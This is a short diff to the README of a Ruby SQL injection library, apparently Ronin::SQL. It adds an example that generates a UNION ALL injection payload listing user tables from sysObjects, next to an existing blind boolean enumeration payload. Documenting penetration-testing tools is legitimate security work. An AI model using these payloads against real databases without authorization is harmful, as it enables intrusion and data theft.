@@ -121,6 +121,15 @@ Enumerate through database table names:
     puts sqli.to_sql
     # 1 AND ASCII(LOWER(SUBSTRING((SELECT name TOP 1 FROM sysobjects WHERE xtype='U'),1,1)))
 
+Find user supplied tables via the `sysObjects` table:
+
+    sqli = Ronin::SQL::Injection.new
+    sqli.union_all {
+      select(1,2,3,4,5,6,name).from(sysObjects).where { xtype == 'U' }
+    }
+    puts sqli.to_sql(:terminate => true)
+    # 1 UNION ALL (SELECT (1,2,3,4,5,6,name) FROM sysObjects WHERE xtype='U');--
+
 
 ## Requirements
 
